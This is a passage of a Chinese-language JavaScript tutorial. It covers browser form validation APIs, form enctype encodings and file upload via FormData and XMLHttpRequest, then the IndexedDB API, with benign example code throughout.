    > 控件元素的`setCustomValidity()`方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。
    >
    > 这个方法可以替换浏览器内置的表单验证报错信息，参数就是要显示的报错信息。
    >
    > ```
    > <form action="somefile.php">
    >   <input
    >     type="text"
    >     name="username"
    >     placeholder="Username"
    >     pattern="[a-z]{1,15}"
    >     id="username"
    >   >
    >   <input type="submit">
    > </form>
    > ```
    >
    > 上面的表单输入框，要求只能输入小写字母，且不得超过15个字符。如果输入不符合要求（比如输入“ABC”），提交表单的时候，Chrome 浏览器会弹出报错信息“Please match the requested format.”，禁止表单提交。下面使用`setCustomValidity()`方法替换掉报错信息。
    >
    > ```
    > var input = document.getElementById('username');
    > input.oninvalid = function (event) {
    >   event.target.setCustomValidity(
    >     '用户名必须是小写字母，不能为空，最长不超过15个字符'
    >   );
    > }
    > ```
    >
    > 上面代码中，`setCustomValidity()`方法是在`invalid`事件的监听函数里面调用。该方法也可以直接调用，这时如果参数不为空字符串，浏览器就会认为该控件没有通过校验，就会立刻显示该方法设置的报错信息。
    >
    > ```
    > /* HTML 代码如下
    > <form>
    >   <p><input type="file" id="fs"></p>
    >   <p><input type="submit"></p>
    > </form>
    > */
    > 
    > document.getElementById('fs').onchange = checkFileSize;
    > 
    > function checkFileSize() {
    >   var fs = document.getElementById('fs');
    >   var files = fs.files;
    >   if (files.length > 0) {
    >      if (files[0].size > 75 * 1024) {
    >        fs.setCustomValidity('文件不能大于 75KB');
    >        return;
    >      }
    >   }
    >   fs.setCustomValidity('');
    > }
    > ```
    >
    > 上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。
    >
    > ### validity 属性
    >
    > 控件元素的属性`validity`属性返回一个`ValidityState`对象，包含当前校验状态的信息。
    >
    > 该对象有以下属性，全部为只读属性。
    >
    > - `ValidityState.badInput`：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。
    > - `ValidityState.customError`：布尔值，表示是否已经调用`setCustomValidity()`方法，将校验信息设置为一个非空字符串。
    > - `ValidityState.patternMismatch`：布尔值，表示用户输入的值是否不满足模式的要求。
    > - `ValidityState.rangeOverflow`：布尔值，表示用户输入的值是否大于最大范围。
    > - `ValidityState.rangeUnderflow`：布尔值，表示用户输入的值是否小于最小范围。
    > - `ValidityState.stepMismatch`：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。
    > - `ValidityState.tooLong`：布尔值，表示用户输入的字数超出了最长字数。
    > - `ValidityState.tooShort`：布尔值，表示用户输入的字符少于最短字数。
    > - `ValidityState.typeMismatch`：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。
    > - `ValidityState.valid`：布尔值，表示用户是否满足所有校验条件。
    > - `ValidityState.valueMissing`：布尔值，表示用户没有填入必填的值。
    >
    > 下面是一个例子。
    >
    > ```
    > var input = document.getElementById('myinput');
    > if (input.validity.valid) {
    >   console.log('通过校验');
    > } else {
    >   console.log('校验失败');
    > }
    > ```
    >
    > 下面是另外一个例子。
    >
    > ```
    > var txt = '';
    > if (document.getElementById('myInput').validity.rangeOverflow) {
    >   txt = '数值超过上限';
    > }
    > document.getElementById('prompt').innerHTML = txt;
    > ```
    >
    > 如果想禁止浏览器弹出表单验证的报错信息，可以监听`invalid`事件。
    >
    > ```
    > var input = document.getElementById('username');
    > var form  = document.getElementById('form');
    > 
    > var elem = document.createElement('div');
    > elem.id  = 'notify';
    > elem.style.display = 'none';
    > form.appendChild(elem);
    > 
    > input.addEventListener('invalid', function (event) {
    >   event.preventDefault();
    >   if (!event.target.validity.valid) {
    >     elem.textContent   = '用户名必须是小写字母';
    >     elem.className     = 'error';
    >     elem.style.display = 'block';
    >     input.className    = 'invalid animated shake';
    >   }
    > });
    > 
    > input.addEventListener('input', function(event){
    >   if ( 'block' === elem.style.display ) {
    >     input.className = '';
    >     elem.style.display = 'none';
    >   }
    > });
    > ```
    >
    > 上面代码中，一旦发生`invalid`事件（表单验证失败），`event.preventDefault()`用来禁止浏览器弹出默认的验证失败提示，然后设置定制的报错提示框。
    >
    > ### 表单的 novalidate 属性
    >
    > 表单元素的 HTML 属性`novalidate`，可以关闭浏览器的自动校验。
    >
    > ```
    > <form novalidate>
    > </form>
    > ```
    >
    > 这个属性也可以在脚本里设置。
    >
    > ```
    > form.noValidate = true;
    > ```
    >
    > 如果表单元素没有设置`novalidate`属性，那么提交按钮（`<button>`或`<input>`元素）的`formnovalidate`属性也有同样的作用。
    >
    > ```
    > <form>
    >   <input type="submit" value="submit" formnovalidate>
    > </form>
    > ```
    >
    > ## enctype 属性
    >
    > 表单能够用四种编码，向服务器发送数据。编码格式由表单的`enctype`属性决定。
    >
    > 假定表单有两个字段，分别是`foo`和`baz`，其中`foo`字段的值等于`bar`，`baz`字段的值是一个分为两行的字符串。
    >
    > ```
    > The first line.
    > The second line.
    > ```
    >
    > 下面四种格式，都可以将这个表单发送到服务器。
    >
    > **（1）GET 方法**
    >
    > 如果表单使用`GET`方法发送数据，`enctype`属性无效。
    >
    > ```
    > <form
    >   action="register.php"
    >   method="get"
    >   onsubmit="AJAXSubmit(this); return false;"
    > >
    > </form>
    > ```
    >
    > 数据将以 URL 的查询字符串发出。
    >
    > ```
    > ?foo=bar&baz=The%20first%20line.%0AThe%20second%20line.
    > ```
    >
    > **（2）application/x-www-form-urlencoded**
    >
    > 如果表单用`POST`方法发送数据，并省略`enctype`属性，那么数据以`application/x-www-form-urlencoded`格式发送（因为这是默认值）。
    >
    > ```
    > <form
    >   action="register.php"
    >   method="post"
    >   onsubmit="AJAXSubmit(this); return false;"
    > >
    > </form>
    > ```
    >
    > 发送的 HTTP 请求如下。
    >
    > ```
    > Content-Type: application/x-www-form-urlencoded
    > 
    > foo=bar&baz=The+first+line.%0D%0AThe+second+line.%0D%0A
    > ```
    >
    > 上面代码中，数据体里面的`%0D%0A`代表换行符（`\r\n`）。
    >
    > **（3）text/plain**
    >
    > 如果表单使用`POST`方法发送数据，`enctype`属性为`text/plain`，那么数据将以纯文本格式发送。
    >
    > ```
    > <form
    >   action="register.php"
    >   method="post"
    >   enctype="text/plain"
    >   onsubmit="AJAXSubmit(this); return false;"
    > >
    > </form>
    > ```
    >
    > 发送的 HTTP 请求如下。
    >
    > ```
    > Content-Type: text/plain
    > 
    > foo=bar
    > baz=The first line.
    > The second line.
    > ```
    >
    > **（4）multipart/form-data**
    >
    > 如果表单使用`POST`方法，`enctype`属性为`multipart/form-data`，那么数据将以混合的格式发送。
    >
    > ```
    > <form
    >   action="register.php"
    >   method="post"
    >   enctype="multipart/form-data"
    >   onsubmit="AJAXSubmit(this); return false;"
    > >
    > </form>
    > ```
    >
    > 发送的 HTTP 请求如下。
    >
    > ```
    > Content-Type: multipart/form-data; boundary=---------------------------314911788813839
    > 
    > -----------------------------314911788813839
    > Content-Disposition: form-data; name="foo"
    > 
    > bar
    > -----------------------------314911788813839
    > Content-Disposition: form-data; name="baz"
    > 
    > The first line.
    > The second line.
    > 
    > -----------------------------314911788813839--
    > ```
    >
    > 这种格式也是文件上传的格式。
    >
    > ## 文件上传
    >
    > 用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。
    >
    > ```
    > <input type="file" id="file" name="myFile">
    > ```
    >
    > 此外，还需要将表单`<form>`元素的`method`属性设为`POST`，`enctype`属性设为`multipart/form-data`。其中，`enctype`属性决定了 HTTP 头信息的`Content-Type`字段的值，默认情况下这个字段的值是`application/x-www-form-urlencoded`，但是文件上传的时候要改成`multipart/form-data`。
    >
    > ```
    > <form method="post" enctype="multipart/form-data">
    >   <div>
    >     <label for="file">选择一个文件</label>
    >     <input type="file" id="file" name="myFile" multiple>
    >   </div>
    >   <div>
    >     <input type="submit" id="submit" name="submit_button" value="上传" />
    >   </div>
    > </form>
    > ```
    >
    > 上面的 HTML 代码中，file 控件的`multiple`属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。
    >
    > ```
    > var fileSelect = document.getElementById('file');
    > var files = fileSelect.files;
    > ```
    >
    > 然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。
    >
    > ```
    > var formData = new FormData();
    > 
    > for (var i = 0; i < files.length; i++) {
    >   var file = files[i];
    > 
    >   // 只上传图片文件
    >   if (!file.type.match('image.*')) {
    >     continue;
    >   }
    > 
    >   formData.append('photos[]', file, file.name);
    > }
    > ```
    >
    > 最后，使用 Ajax 向服务器上传文件。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > 
    > xhr.open('POST', 'handler.php', true);
    > 
    > xhr.onload = function () {
    >   if (xhr.status !== 200) {
    >     console.log('An error occurred!');
    >   }
    > };
    > 
    > xhr.send(formData);
    > ```
    >
    > 除了发送 FormData 实例，也可以直接 AJAX 发送文件。
    >
    > ```
    > var file = document.getElementById('test-input').files[0];
    > var xhr = new XMLHttpRequest();
    > 
    > xhr.open('POST', 'myserver/uploads');
    > xhr.setRequestHeader('Content-Type', file.type);
    > xhr.send(file);
    > ```

  - IndexedDB API

    > ## 概述
    >
    > 随着浏览器的功能不断增强，越来越多的网站开始考虑，将大量数据储存在客户端，这样可以减少从服务器获取数据，直接从本地获取数据。
    >
    > 现有的浏览器数据储存方案，都不适合储存大量数据：Cookie 的大小不超过 4KB，且每次请求都会发送回服务器；LocalStorage 在 2.5MB 到 10MB 之间（各家浏览器不同），而且不提供搜索功能，不能建立自定义的索引。所以，需要一种新的解决方案，这就是 IndexedDB 诞生的背景。
    >
    > 通俗地说，IndexedDB 就是浏览器提供的本地数据库，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。
    >
    > IndexedDB 具有以下特点。
    >
    > **（1）键值对储存。** IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JS 对象。对象仓库中，数据以“键值对”的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。
    >
    > **（2）异步。** IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。
    >
    > **（3）支持事务。** IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。
    >
    > **（4）同源限制。** IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。
    >
    > **（5）储存空间大。** IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。
    >
    > **（6）支持二进制储存。** IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。
    >
    > ## 基本概念
    >
    > IndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。
    >
    > - 数据库：IDBDatabase 对象
    > - 对象仓库：IDBObjectStore 对象
    > - 索引： IDBIndex 对象
    > - 事务： IDBTransaction 对象
    > - 操作请求：IDBRequest 对象
    > - 指针： IDBCursor 对象
    > - 主键集合：IDBKeyRange 对象
    >
    > 下面是一些主要的概念。
    >
    > **（1）数据库**
    >
    > 数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。
    >
    > IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。
    >
    > **（2）对象仓库**
    >
    > 每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。
    >
    > **（3）数据记录**
    >
    > 对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。
    >
    > ```
    > { id: 1, text: 'foo' }
    > ```
    >
    > 上面的对象中，`id`属性可以当作主键。
    >
    > 数据体可以是任意数据类型，不限于对象。
    >
    > **（4）索引**
    >
    > 为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。
    >
    > **（5）事务**
    >
    > 数据记录的读写和删改，都要通过事务完成。事务对象提供`error`、`abort`和`complete`三个事件，用来监听操作结果。
    >
    > ## 操作流程
    >
    > IndexedDB 数据库的各种操作，一般是按照下面的流程进行的。这个部分只给出简单的代码示例，用于快速上手，详细的各个对象的 API 放在后文介绍。
    >
    > ### 打开数据库
    >
    > 使用 IndexedDB 的第一步是打开数据库，使用`indexedDB.open()`方法。
    >
    > ```
    > var request = window.indexedDB.open(databaseName, version);
    > ```
    >
    > 这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为`1`。
    >
    > `indexedDB.open()`方法返回一个 IDBRequest 对象。这个对象通过三种事件`error`、`success`、`upgradeneeded`，处理打开数据库的操作结果。
    >
    > **（1）error 事件**
    >
    > `error`事件表示打开数据库失败。
    >
    > ```
    > request.onerror = function (event) {
    >   console.log('数据库打开报错');
    > };
    > ```
    >
    > **（2）success 事件**
    >
    > `success`事件表示成功打开数据库。
    >
    > ```
    > var db;
    > 
    > request.onsuccess = function (event) {
    >   db = request.result;
    >   console.log('数据库打开成功');
    > };
    > ```
    >
    > 这时，通过`request`对象的`result`属性拿到数据库对象。
    >
    > **（3）upgradeneeded 事件**
    >
    > 如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件`upgradeneeded`。
    >
    > ```
    > var db;
    > 
    > request.onupgradeneeded = function (event) {
    >   db = event.target.result;
    > }
    > ```
    >
    > 这时通过事件对象的`target.result`属性，拿到数据库实例。
    >
    > ### 新建数据库
    >
    > 新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在`upgradeneeded`事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。
    >
    > 通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。
    >
    > ```
    > request.onupgradeneeded = function(event) {
    >   db = event.target.result;
    >   var objectStore = db.createObjectStore('person', { keyPath: 'id' });
    > }
    > ```
    >
    > 上面代码中，数据库新建成功以后，新增一张叫做`person`的表格，主键是`id`。
    >
    > 更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。
    >
    > ```
    > request.onupgradeneeded = function (event) {
    >   db = event.target.result;
    >   var objectStore;
    >   if (!db.objectStoreNames.contains('person')) {
    >     objectStore = db.createObjectStore('person', { keyPath: 'id' });
    >   }
    > }
    > ```
    >
    > 主键（key）是默认建立索引的属性。比如，数据记录是`{ id: 1, name: '张三' }`，那么`id`属性可以作为主键。主键也可以指定为下一层对象的属性，比如`{ foo: { bar: 'baz' } }`的`foo.bar`也可以指定为主键。
    >
    > 如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。
    >
    > ```
    > var objectStore = db.createObjectStore(
    >   'person',
    >   { autoIncrement: true }
    > );
    > ```
    >
    > 上面代码中，指定主键为一个递增的整数。
    >
    > 新建对象仓库以后，下一步可以新建索引。
    >
    > ```
    > request.onupgradeneeded = function(event) {
    >   db = event.target.result;
    >   var objectStore = db.createObjectStore('person', { keyPath: 'id' });
    >   objectStore.createIndex('name', 'name', { unique: false });
    >   objectStore.createIndex('email', 'email', { unique: true });
    > }
    > ```
    >
    > 上面代码中，`IDBObject.createIndex()`的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。
    >
    > ### 新增数据
    >
    > 新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。
    >
    > ```
    > function add() {
    >   var request = db.transaction(['person'], 'readwrite')
    >     .objectStore('person')
    >     .add({ id: 1, name: '张三', age: 24, email: 'zhangsan@example.com' });
    > 
    >   request.onsuccess = function (event) {
    >     console.log('数据写入成功');
    >   };
    > 
    >   request.onerror = function (event) {
    >     console.log('数据写入失败');
    >   }
    > }
    > 
    > add();
    > ```
    >
    > 上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（“只读”或“读写”）。新建事务以后，通过`IDBTransaction.objectStore(name)`方法，拿到 IDBObjectStore 对象，再通过表格对象的`add()`方法，向表格写入一条记录。
    >
    > 写入操作是一个异步操作，通过监听连接对象的`success`事件和`error`事件，了解是否写入成功。
    >
    > ### 读取数据
    >
    > 读取数据也是通过事务完成。
    >
    > ```
    > function read() {
    >    var transaction = db.transaction(['person']);
    >    var objectStore = transaction.objectStore('person');
    >    var request = objectStore.get(1);
    > 
    >    request.onerror = function(event) {
    >      console.log('事务失败');
    >    };
    > 
    >    request.onsuccess = function( event) {
    >       if (request.result) {
    >         console.log('Name: ' + request.result.name);
    >         console.log('Age: ' + request.result.age);
    >         console.log('Email: ' + request.result.email);
    >       } else {
    >         console.log('未获得数据记录');
    >       }
    >    };
    > }
    > 
    > read();
    > ```
    >
    > 上面代码中，`objectStore.get()`方法用于读取数据，参数是主键的值。
    >
    > ### 遍历数据
    >
    > 遍历数据表格的所有记录，要使用指针对象 IDBCursor。
    >
    > ```
    > function readAll() {
    >   var objectStore = db.transaction('person').objectStore('person');
    > 
    >    objectStore.openCursor().onsuccess = function (event) {
    >      var cursor = event.target.result;
    > 
    >      if (cursor) {
    >        console.log('Id: ' + cursor.key);
    >        console.log('Name: ' + cursor.value.name);
    >        console.log('Age: ' + cursor.value.age);
    >        console.log('Email: ' + cursor.value.email);
    >        cursor.continue();
    >     } else {
    >       console.log('没有更多数据了！');
    >     }
    >   };
    > }
    > 
    > readAll();
    > ```
    >
    > 上面代码中，新建指针对象的`openCursor()`方法是一个异步操作，所以要监听`success`事件。
    >
    > ### 更新数据
    >
    > 更新数据要使用`IDBObject.put()`方法。
    >
    > ```
    > function update() {
    >   var request = db.transaction(['person'], 'readwrite')
    >     .objectStore('person')
    >     .put({ id: 1, name: '李四', age: 35, email: 'lisi@example.com' });
    > 
    >   request.onsuccess = function (event) {
    >     console.log('数据更新成功');
    >   };
    > 
    >   request.onerror = function (event) {
    >     console.log('数据更新失败');
    >   }
    > }
    > 
    > update();
    > ```
    >
    > 上面代码中，`put()`方法自动更新了主键为`1`的记录。
    >
    > ### 删除数据
    >
    > `IDBObjectStore.delete()`方法用于删除记录。
    >
    > ```
    > function remove() {
    >   var request = db.transaction(['person'], 'readwrite')
    >     .objectStore('person')
    >     .delete(1);
    > 
    >   request.onsuccess = function (event) {
    >     console.log('数据删除成功');
    >   };
    > }
    > 
    > remove();
    > ```
    >
    > ### 使用索引
    >
    > 索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。
    >
    > 假定新建表格的时候，对`name`字段建立了索引。
    >
    > ```
    > objectStore.createIndex('name', 'name', { unique: false });
    > ```
    >
    > 现在，就可以从`name`找到对应的数据记录了。
    >
    > ```
    > var transaction = db.transaction(['person'], 'readonly');
    > var store = transaction.objectStore('person');
    > var index = store.index('name');
    > var request = index.get('李四');
    > 
    > request.onsuccess = function (e) {
    >   var result = e.target.result;
    >   if (result) {
    >     // ...
    >   } else {
    >     // ...
    >   }
    > }
    > ```
    >
    > ## indexedDB 对象
    >
    > 浏览器原生提供`indexedDB`对象，作为开发者的操作接口。
    >
    > ### indexedDB.open()
    >
    > `indexedDB.open()`方法用于打开数据库。这是一个异步操作，但是会立刻返回一个 IDBOpenDBRequest 对象。
    >
    > ```
    > var openRequest = window.indexedDB.open('test', 1);
    > ```
    >
    > 上面代码表示，打开一个名为`test`、版本为`1`的数据库。如果该数据库不存在，则会新建该数据库。
    >
    > `open()`方法的第一个参数是数据库名称，格式为字符串，不可省略；第二个参数是数据库版本，是一个大于`0`的正整数（`0`将报错），如果该参数大于当前版本，会触发数据库升级。第二个参数可省略，如果数据库已存在，将打开当前版本的数据库；如果数据库不存在，将创建该版本的数据库，默认版本为`1`。
    >
    > 打开数据库是异步操作，通过各种事件通知客户端。下面是有可能触发的4种事件。
    >
    > - **success**：打开成功。
    > - **error**：打开失败。
    > - **upgradeneeded**：第一次打开该数据库，或者数据库版本发生变化。
    > - **blocked**：上一次的数据库连接还未关闭。
    >
    > 第一次打开数据库时，会先触发`upgradeneeded`事件，然后触发`success`事件。
    >
    > 根据不同的需要，对上面4种事件监听函数。
    >
    > ```
    > var openRequest = indexedDB.open('test', 1);
    > var db;
    > 
    > openRequest.onupgradeneeded = function (e) {
    >   console.log('Upgrading...');
    > }
    > 
    > openRequest.onsuccess = function (e) {
    >   console.log('Success!');
    >   db = openRequest.result;
    > }
    > 
    > openRequest.onerror = function (e) {
    >   console.log('Error');
    >   console.log(e);
    > }
    > ```
    >
    > 上面代码有两个地方需要注意。首先，`open()`方法返回的是一个对象（IDBOpenDBRequest），监听函数就定义在这个对象上面。其次，`success`事件发生后，从`openRequest.result`属性可以拿到已经打开的`IndexedDB`数据库对象。
    >
    > ### indexedDB.deleteDatabase()
    >
    > `indexedDB.deleteDatabase()`方法用于删除一个数据库，参数为数据库的名字。它会立刻返回一个`IDBOpenDBRequest`对象，然后对数据库执行异步删除。删除操作的结果会通过事件通知，`IDBOpenDBRequest`对象可以监听以下事件。
    >
    > - `success`：删除成功
    > - `error`：删除报错
    >
    > ```
    > var DBDeleteRequest = window.indexedDB.deleteDatabase('demo');
    > 
    > DBDeleteRequest.onerror = function (event) {
    >   console.log('Error');
    > };
    > 
    > DBDeleteRequest.onsuccess = function (event) {
    >   console.log('success');
    > };
    > ```
    >
    > 调用`deleteDatabase()`方法以后，当前数据库的其他已经打开的连接都会接收到`versionchange`事件。
    >
    > 注意，删除不存在的数据库并不会报错。
    >
    > ### indexedDB.cmp()
    >
    > `indexedDB.cmp()`方法比较两个值是否为 indexedDB 的相同的主键。它返回一个整数，表示比较的结果：`0`表示相同，`1`表示第一个主键大于第二个主键，`-1`表示第一个主键小于第二个主键。
    >
    > ```
    > window.indexedDB.cmp(1, 2) // -1
    > ```
    >
    > 注意，这个方法不能用来比较任意的 JS 值。如果参数是布尔值或对象，它会报错。
    >
    > ```
    > window.indexedDB.cmp(1, true) // 报错
    > window.indexedDB.cmp({}, {}) // 报错
    > ```
    >
    > ## IDBRequest 对象
    >
    > IDBRequest 对象表示打开的数据库连接，`indexedDB.open()`方法和`indexedDB.deleteDatabase()`方法会返回这个对象。数据库的操作都是通过这个对象完成的。
    >
    > 这个对象的所有操作都是异步操作，要通过`readyState`属性判断是否完成，如果为`pending`就表示操作正在进行，如果为`done`就表示操作完成，可能成功也可能失败。
    >
    > 操作完成以后，触发`success`事件或`error`事件，这时可以通过`result`属性和`error`属性拿到操作结果。如果在`pending`阶段，就去读取这两个属性，是会报错的。
    >
    > IDBRequest 对象有以下属性。
    >
    > - `IDBRequest.readyState`：等于`pending`表示操作正在进行，等于`done`表示操作正在完成。
    > - `IDBRequest.result`：返回请求的结果。如果请求失败、结果不可用，读取该属性会报错。
    > - `IDBRequest.error`：请求失败时，返回错误对象。
    > - `IDBRequest.source`：返回请求的来源（比如索引对象或 ObjectStore）。
    > - `IDBRequest.transaction`：返回当前请求正在进行的事务，如果不包含事务，返回`null`。
    > - `IDBRequest.onsuccess`：指定`success`事件的监听函数。
    > - `IDBRequest.onerror`：指定`error`事件的监听函数。
    >
    > IDBOpenDBRequest 对象继承了 IDBRequest 对象，提供了两个额外的事件监听属性。
    >
    > - `IDBOpenDBRequest.onblocked`：指定`blocked`事件（`upgradeneeded`事件触发时，数据库仍然在使用）的监听函数。
    > - `IDBOpenDBRequest.onupgradeneeded`：`upgradeneeded`事件的监听函数。
    >
    > ## IDBDatabase 对象
    >
    > 打开数据成功以后，可以从`IDBOpenDBRequest`对象的`result`属性上面，拿到一个`IDBDatabase`对象，它表示连接的数据库。后面对数据库的操作，都通过这个对象完成。
    >
    > ```
    > var db;
    > var DBOpenRequest = window.indexedDB.open('demo', 1);
    > 
    > DBOpenRequest.onerror = function (event) {
    >   console.log('Error');
    > };
    > 
    > DBOpenRequest.onsuccess = function(event) {
    >   db = DBOpenRequest.result;
    >   // ...
    > };
    > ```
    >
    > ### 属性
    >
    > IDBDatabase 对象有以下属性。
    >
    > - `IDBDatabase.name`：字符串，数据库名称。
    > - `IDBDatabase.version`：整数，数据库版本。数据库第一次创建时，该属性为空字符串。
    > - `IDBDatabase.objectStoreNames`：DOMStringList 对象（字符串的集合），包含当前数据的所有 object store 的名字。
    > - `IDBDatabase.onabort`：指定 abort 事件（事务中止）的监听函数。
    > - `IDBDatabase.onclose`：指定 close 事件（数据库意外关闭）的监听函数。
    > - `IDBDatabase.onerror`：指定 error 事件（访问数据库失败）的监听函数。
    > - `IDBDatabase.onversionchange`：数据库版本变化时触发（发生`upgradeneeded`事件，或调用`indexedDB.deleteDatabase()`）。
    >
    > 下面是`objectStoreNames`属性的例子。该属性返回一个 DOMStringList 对象，包含了当前数据库所有对象仓库的名称（即表名），可以使用 DOMStringList 对象的`contains`方法，检查数据库是否包含某个对象仓库。
    >
    > ```
    > if (!db.objectStoreNames.contains('firstOS')) {
    >   db.createObjectStore('firstOS');
    > }
    > ```
    >
    > 上面代码先判断某个对象仓库是否存在，如果不存在就创建该对象仓库。
    >
    > ### 方法
    >
    > IDBDatabase 对象有以下方法。
    >
    > - `IDBDatabase.close()`：关闭数据库连接，实际会等所有事务完成后再关闭。
    > - `IDBDatabase.createObjectStore()`：创建存放数据的对象仓库，类似于传统关系型数据库的表格，返回一个 IDBObjectStore 对象。该方法只能在`versionchange`事件监听函数中调用。
    > - `IDBDatabase.deleteObjectStore()`：删除指定的对象仓库。该方法只能在`versionchange`事件监听函数中调用。
    > - `IDBDatabase.transaction()`：返回一个 IDBTransaction 事务对象。
    >
    > 下面是`createObjectStore()`方法的例子。
    >
    > ```
    > var request = window.indexedDB.open('demo', 2);
    > 
    > request.onupgradeneeded = function (event) {
    >   var db = event.target.result;
    > 
    >   db.onerror = function(event) {
    >     console.log('error');
    >   };
    > 
    >   var objectStore = db.createObjectStore('items');
    > 
    >   // ...
    > };
    > ```
    >
    > 上面代码创建了一个名为`items`的对象仓库，如果该对象仓库已经存在，就会抛出一个错误。为了避免出错，需要用到下文的`objectStoreNames`属性，检查已有哪些对象仓库。
    >
    > `createObjectStore()`方法还可以接受第二个对象参数，用来设置对象仓库的属性。
    >
    > ```
    > db.createObjectStore('test', { keyPath: 'email' });
    > db.createObjectStore('test2', { autoIncrement: true });
    > ```
    >
    > 上面代码中，`keyPath`属性表示主键（由于主键的值不能重复，所以上例存入之前，必须保证数据的`email`属性值都是不一样的），默认值为`null`；`autoIncrement`属性表示，是否使用自动递增的整数作为主键（第一个数据记录为1，第二个数据记录为2，以此类推），默认为`false`。一般来说，`keyPath`和`autoIncrement`属性只要使用一个就够了，如果两个同时使用，表示主键为递增的整数，且对象不得缺少`keyPath`指定的属性。
    >
    > 下面是`deleteObjectStore()`方法的例子。
    >
    > ```
    > var dbName = 'sampleDB';
    > var dbVersion = 2;
    > var request = indexedDB.open(dbName, dbVersion);
    > 
    > request.onupgradeneeded = function(e) {
    >   var db = request.result;
    >   if (e.oldVersion < 1) {
    >     db.createObjectStore('store1');
    >   }
    > 
    >   if (e.oldVersion < 2) {
    >     db.deleteObjectStore('store1');
    >     db.createObjectStore('store2');
    >   }
    > 
    >   // ...
    > };
    > ```
    >
    > 下面是`transaction()`方法的例子，该方法用于创建一个数据库事务，返回一个 IDBTransaction 对象。向数据库添加数据之前，必须先创建数据库事务。
    >
    > ```
    > var t = db.transaction(['items'], 'readwrite');
    > ```
    >
    > `transaction()`方法接受两个参数：第一个参数是一个数组，里面是所涉及的对象仓库，通常是只有一个；第二个参数是一个表示操作类型的字符串。目前，操作类型只有两种：`readonly`（只读）和`readwrite`（读写）。添加数据使用`readwrite`，读取数据使用`readonly`。第二个参数是可选的，省略时默认为`readonly`模式。
    >
    > ## IDBObjectStore 对象
    >
    > IDBObjectStore 对象对应一个对象仓库（object store）。`IDBDatabase.createObjectStore()`方法返回的就是一个 IDBObjectStore 对象。
    >
    > IDBDatabase 对象的`transaction()`返回一个事务对象，该对象的`objectStore()`方法返回 IDBObjectStore 对象，因此可以采用下面的链式写法。
    >
    > ```
    > db.transaction(['test'], 'readonly')
    >   .objectStore('test')
    >   .get(X)
    >   .onsuccess = function (e) {}
    > ```
    >
    > ### 属性
    >
    > IDBObjectStore 对象有以下属性。
    >
    > - `IDBObjectStore.indexNames`：返回一个类似数组的对象（DOMStringList），包含了当前对象仓库的所有索引。
    > - `IDBObjectStore.keyPath`：返回当前对象仓库的主键。
    > - `IDBObjectStore.name`：返回当前对象仓库的名称。
    > - `IDBObjectStore.transaction`：返回当前对象仓库所属的事务对象。
    > - `IDBObjectStore.autoIncrement`：布尔值，表示主键是否会自动递增。
    >
    > ### 方法
    >
    > IDBObjectStore 对象有以下方法。
    >
    > **（1）IDBObjectStore.add()**
    >
    > `IDBObjectStore.add()`用于向对象仓库添加数据，返回一个 IDBRequest 对象。该方法只用于添加数据，如果主键相同会报错，因此更新数据必须使用`put()`方法。
    >
    > ```
    > objectStore.add(value, key)
    > ```
    >
    > 该方法接受两个参数，第一个参数是键值，第二个参数是主键，该参数可选，如果省略默认为`null`。
    >
    > 创建事务以后，就可以获取对象仓库，然后使用`add()`方法往里面添加数据了。
    >
